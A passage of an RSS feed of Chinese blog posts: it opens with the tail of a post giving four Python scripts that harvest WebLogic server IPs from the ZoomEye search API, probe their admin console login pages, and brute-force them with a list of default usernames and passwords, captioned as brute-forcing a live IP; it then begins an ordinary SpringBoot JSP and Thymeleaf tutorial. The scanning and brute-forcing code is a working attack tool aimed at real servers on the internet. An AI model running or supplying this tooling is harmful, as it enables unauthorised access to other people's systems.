  logheaders&lt;/span&gt;={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Authorization&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;JWT&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;+&lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;+&lt;span&gt;access_token}
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; x &lt;span&gt;in&lt;/span&gt; range(10&lt;span&gt;):
      &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]page is {}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(x))
      url2s&lt;/span&gt;=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://api.zoomeye.org/host/search?query=app:weblogic&amp;amp;page={}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(x)
      rest2&lt;/span&gt;=requests.get(url=url2s,headers=&lt;span&gt;logheaders)
      vd&lt;/span&gt;=rest2.json()[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;matches&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;][0:]
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; q &lt;span&gt;in&lt;/span&gt;&lt;span&gt; vd:
          sj&lt;/span&gt;=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IP:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,q[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ip&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;],&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Port:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,q[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;portinfo&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;][&lt;span&gt;'&lt;/span&gt;&lt;span&gt;port&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;],&lt;span&gt;'&lt;/span&gt;&lt;span&gt;App:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,q[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;portinfo&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;][&lt;span&gt;'&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
          &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(sj)
          &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(sj,file=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
zoomeye()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;weblogicjiexi.py&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; requests
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; jx():
    xj&lt;/span&gt;=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save2.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    xj.close()

    error&lt;/span&gt;=[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;404&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Not Found&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;不存在&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;403&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
    ok&lt;/span&gt;=&lt;span&gt;[]
    headers &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;user-agent&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
    kew &lt;/span&gt;= open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; p &lt;span&gt;in&lt;/span&gt;&lt;span&gt; kew.readlines():
        we &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;.join(p.split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
        pow &lt;/span&gt;= re.findall(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,we)
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; pow:
            pd &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(i).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;''&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;''&lt;/span&gt;).replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;''&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).replace(&lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;, &lt;span&gt;''&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                rsc&lt;/span&gt;=requests.get(url=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://{}/console/login/LoginForm.jsp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(pd),headers=headers,timeout=1.1&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; error:
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; rsc.status_code==200 &lt;span&gt;and&lt;/span&gt; rsc.text &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; e:
                        ok.append(rsc.url)

            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:

                &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;&lt;span&gt;

    id &lt;/span&gt;=&lt;span&gt; list(set(ok))
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; p &lt;span&gt;in&lt;/span&gt;&lt;span&gt; id:
        lk&lt;/span&gt;=re.findall(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.*/console/login/LoginForm.jsp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,p)
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; lk:
            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]ok url:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,i+&lt;span&gt;''&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(i+&lt;span&gt;''&lt;/span&gt;,file=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save2.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))

jx()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;weblogiczhuanhuan.py&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re

rl&lt;/span&gt;=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save3.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
rl.close()

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; os.path.exists(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save2.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]ok save2.txt !&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[-]Not found save2.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    exit()


yw&lt;/span&gt;=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save2.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; yw.readlines():
    w&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;.join(e.split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
    yd&lt;/span&gt;=re.sub(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/console/login/LoginForm.jsp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/console/j_security_check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,w)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(yd)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(yd,file=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save3.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;weblogicbaopo.py&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; requests
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; threading

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; main(ip):
    datas&lt;/span&gt;=&lt;span&gt;{}
    listd&lt;/span&gt;=[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;weblogic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;weblogic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;weblogic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;welcomel&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;system&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;password&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;security&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;mary&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;password&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;joe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;password&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;wlcsystem&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;wlcsystem&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;wlpisystem&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;wlpisystem&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;weblogic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;weblogic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;12345678&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;12345678&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
    url&lt;/span&gt;=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(ip)
    headers&lt;/span&gt;={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;user-agent&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; user &lt;span&gt;in&lt;/span&gt;&lt;span&gt; listd:
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; passwd &lt;span&gt;in&lt;/span&gt;&lt;span&gt; listd:
        data&lt;/span&gt;=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;j_username={}&amp;amp;j_password={}&amp;amp;j_character_encoding=UTF-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(user,passwd)
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; j &lt;span&gt;in&lt;/span&gt; data.split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
            key,value&lt;/span&gt;=j.split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,1&lt;span&gt;)
            datas[key]&lt;/span&gt;=&lt;span&gt;value
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
          request&lt;/span&gt;=requests.post(url=url,headers=headers,data=datas,allow_redirects=&lt;span&gt;False)
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; request.status_code==302 &lt;span&gt;and&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;console&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;in&lt;/span&gt; request.headers[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Location&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] &lt;span&gt;and&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;LoginForm.jsp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt; request.headers[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Location&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]:
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]url:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(request.url))
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]username:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(user))
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[+]password:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(passwd))
          &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[-]url:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(request.url))
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[-]Error username:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(user))
              &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[-]Error password:{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(passwd))
        &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;

&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    we&lt;/span&gt;=open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;save3.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; w &lt;span&gt;in&lt;/span&gt;&lt;span&gt; we.readlines():
        x&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;.join(w.split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
        main(x)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;测试&lt;/h2&gt;
&lt;p&gt;正在爆破某个IP的截图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1174022/201807/1174022-20180711230849140-896966089.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 11 Jul 2018 15:09:00 +0000</pubDate>
<dc:creator>东京$</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/haq5201314/p/9297208.html</dc:identifier>
</item>
<item>
<title>SpringBoot整合Jsp和Thymeleaf (附工程) - 虚无境</title>
<link>http://www.cnblogs.com/xuwujing/p/9297165.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xuwujing/p/9297165.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;本篇文章主要讲述&lt;strong&gt;SpringBoot&lt;/strong&gt;整合&lt;strong&gt;Jsp&lt;/strong&gt;以及&lt;strong&gt;SpringBoot&lt;/strong&gt;整合&lt;strong&gt;Thymeleaf&lt;/strong&gt;，实现一个简单的用户增删改查示例工程。事先说明，这两个是单独整合的，也就是两个工程。如需其中一个，只需看相应部分的介绍即可。若需工程源代码，可以直接跳到底部，通过链接下载工程代码。&lt;/p&gt;
&lt;h2 id=&quot;springboot整合jsp&quot;&gt;SpringBoot整合Jsp&lt;/h2&gt;
&lt;h3 id=&quot;开发准备&quot;&gt;开发准备&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;环境要求&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;JDK&lt;/strong&gt;: 1.7或以上&lt;br/&gt;&lt;strong&gt;SQL&lt;/strong&gt;: MySql&lt;/p&gt;
&lt;p&gt;这里我们需要在mysql中建立一张用户表，用于存储用户的信息。&lt;br/&gt;&lt;strong&gt;数据库脚本如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CREATE TABLE `t_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(10) DEFAULT NULL COMMENT '姓名',
  `age` int(2) DEFAULT NULL COMMENT '年龄',
  `password` varchar(24) NOT NULL COMMENT '密码',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;新建好表之后，我们再来创建工程。&lt;br/&gt;我们的这个工程是通过maven创建一个普通的web工程。&lt;br/&gt;创建好工程之后，我们需要下载相应的jar包，然后再来进行相关的开发。&lt;br/&gt;这些jar包我们在pom.xml文件中添加springBoot和Jsp相关的jar即可。&lt;br/&gt;相关的注释以及写在其中了，这里就不在过多讲述了。&lt;br/&gt;&lt;strong&gt;Maven依赖如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; &amp;lt;dependencies&amp;gt;
        &amp;lt;!-- Spring Boot Web 依赖 核心 --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt; 
            &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;!-- Spring Boot 热部署 class文件之后会自动重启 --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-devtools&amp;lt;/artifactId&amp;gt;
            &amp;lt;optional&amp;gt;true&amp;lt;/optional&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;!-- Spring Boot Test 依赖 --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;
        
        &amp;lt;!-- Spring Boot JPA --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-data-jpa&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
        
          &amp;lt;!-- Spring Boot Mybatis 依赖 --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.mybatis.spring.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;mybatis-spring-boot-starter&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;${mybatis-spring-boot}&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;mysql&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;mysql-connector-java&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;
        
        &amp;lt;!--fastjson 相关jar --&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;${fastjson}&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        
                &amp;lt;!--JSP 依赖  --&amp;gt;
        &amp;lt;!-- servlet依赖. --&amp;gt;  
        &amp;lt;dependency&amp;gt;  
            &amp;lt;groupId&amp;gt;javax.servlet&amp;lt;/groupId&amp;gt;  
            &amp;lt;artifactId&amp;gt;jstl&amp;lt;/artifactId&amp;gt;
        &amp;lt;/dependency&amp;gt;  
        
        &amp;lt;dependency&amp;gt;  
            &amp;lt;groupId&amp;gt;javax.servlet&amp;lt;/groupId&amp;gt;  
            &amp;lt;artifactId&amp;gt;javax.servlet-api&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;provided&amp;lt;/scope&amp;gt;  
        &amp;lt;/dependency&amp;gt;  
       
        &amp;lt;!-- tomcat的支持.--&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.apache.tomcat.embed&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;tomcat-embed-jasper&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;provided&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;    
  &amp;lt;/dependencies&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;相关的Jar包下载完毕之后，我们再来确认项目的工程结构。&lt;br/&gt;首先是后台相关包说明:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;src/main/java
com.pancm.web - Controller 层
com.pancm.dao - 数据操作层 DAO
com.pancm.pojo- 实体类
com.pancm.service - 业务逻辑层
Application - 应用启动类

src/main/resources
application.properties - 应用配置文件，应用启动会自动读取配置&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前端的相关文件存放说明:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;src/main/webapp
WEB-INF - web.xml web相关的核心配置
WEB-INF/jsp - JSP文件的存放路径&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;整体工程结构图:&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1138196/201807/1138196-20180711225450626-226602569.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;工程结构确认之后，我们再来添加相应的配置。&lt;br/&gt;只需在&lt;strong&gt;application.properties&lt;/strong&gt; 添加相应的配置即可。&lt;br/&gt;数据源的配置和之前的差不多，需要注意的是&lt;strong&gt;Jsp&lt;/strong&gt;的相关配置。&lt;br/&gt;由于springBoot默认的支持的模版是&lt;strong&gt;Thymeleaf&lt;/strong&gt;，所以这里我们需要进行相应的更改。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置如下:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;## 编码
banner.charset=UTF-8
server.tomcat.uri-encoding=UTF-8
spring.http.encoding.charset=UTF-8
spring.http.encoding.enabled=true
spring.http.encoding.force=true
spring.messages.encoding=UTF-8
## 端口
server.port=8088

## 数据源
spring.datasource.url=jdbc:mysql://localhost:3306/springBoot?useUnicode=true&amp;amp;characterEncoding=utf8
spring.datasource.username=root
spring.datasource.password=123456
spring.datasource.driver-class-name=com.mysql.jdbc.Driver

## JSP配置
# 页面默认前缀
spring.mvc.view.prefix=/WEB-INF/jsp/
# 响应页面默认后缀
spring.mvc.view.suffix=.jsp&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;代码编写&quot;&gt;代码编写&lt;/h3&gt;
&lt;p&gt;其实这里的代码和之前文章讲述的基本一致，唯一有点区别的是，这里我是用JPA实现对数据库进行操作的(也就是顺便说下JPA这个框架的使用)。&lt;/p&gt;
